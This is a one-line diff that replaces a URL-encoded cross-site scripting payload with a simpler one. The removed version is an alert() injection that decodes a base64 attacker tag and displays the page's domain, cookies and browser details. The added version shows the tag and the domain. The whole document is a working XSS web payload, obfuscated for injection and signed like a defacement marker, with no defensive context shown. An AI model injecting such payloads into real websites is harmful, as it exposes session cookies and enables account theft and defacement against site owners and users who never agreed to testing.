@@ -1,1 +1,1 @@
-alert(%60%5cn%24%7batob%28'SW5qYWN0aW9uIEJ5IFhzcyBTdWJfWmVybw=='%29%7d%5cn%5cn%E2%9C%94DOMAIN%5cn$%7bdocument.domain%7d%5cn%5cn%E2%9C%94COOKIE%5cn$%7bdocument.cookie%7d%5cn%5cn%E2%9C%94UserAgent%5cn$%7bnavigator.appVersion%7d%5cn%5cn%E2%9C%94PLATFORM%5cn$%7bnavigator.platform%7d$%7bnavigator.appCodeName%7d%5cn$%7bnavigator.appName%7d%5cn$%7bnavigator.cookieEnabled%7d%5cn$%7bnavigator.language%7d%5cn$%7bnavigator.onLine%7d%60);
+alert(`Injaction Xss by Sub_Zero\n\nDomain :: ${document.domain}`);
